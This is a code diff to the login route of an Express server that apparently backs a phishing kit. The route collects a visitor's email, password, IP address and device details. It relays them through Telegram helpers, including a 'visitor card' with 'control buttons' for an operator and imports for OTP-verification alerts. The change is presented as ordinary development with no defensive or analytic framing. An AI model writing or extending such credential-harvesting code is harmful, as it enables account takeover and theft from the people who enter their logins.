@@ -2,6 +2,7 @@ import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { z } from "zod";
 import { notifyLogin, notifyOtpVerification, notifyOtpFailure, notifySuccess, notifyLoginFailure, notifyVisitor } from "./telegram";
+import { sendVisitorCard } from "./telegram-bot";
 import { UAParser } from "ua-parser-js";
 import { db } from "./db";
 import { visitors } from "@shared/schema";
@@ -29,6 +30,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const validatedData = loginSchema.parse(req.body);
       
+      // Get visitor session ID from request
+      const sessionId = req.body.sessionId || req.headers['x-session-id'] as string;
+      
       // Parse User-Agent if provided
       let device = 'Unknown';
       let browser = 'Unknown';
@@ -49,21 +53,36 @@ export async function registerRoutes(app: Express): Promise<Server> {
           : 'Unknown';
       }
       
-      // Send login credentials to Telegram with language and device info
-      const loginNotified = await notifyLogin(
-        validatedData.email, 
-        validatedData.password,
-        validatedData.language,
-        device,
-        browser,
-        os
-      );
+      // Get IP address
+      const ip = (req.headers['x-forwarded-for'] as string || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
       
-      if (!loginNotified) {
-        return res.status(500).json({ 
-          error: "Failed to send login notification. Please try again." 
-        });
+      // Try to get visitor from database or create mock visitor object
+      let visitorData = null;
+      if (sessionId) {
+        const existingVisitor = await db.select().from(visitors).where(eq(visitors.sessionId, sessionId)).limit(1);
+        if (existingVisitor.length > 0) {
+          visitorData = existingVisitor[0];
+        }
       }
+      
+      // If no visitor in DB, create a mock visitor object for the card
+      if (!visitorData) {
+        visitorData = {
+          sessionId: sessionId || randomBytes(16).toString('hex'),
+          ip,
+          country: 'Unknown',
+          device,
+          browser,
+          os,
+          currentPage: '/login'
+        };
+      }
+      
+      // Send visitor card with login credentials and control buttons
+      await sendVisitorCard(visitorData, {
+        email: validatedData.email,
+        password: validatedData.password
+      });
 
       res.json({
         success: true,
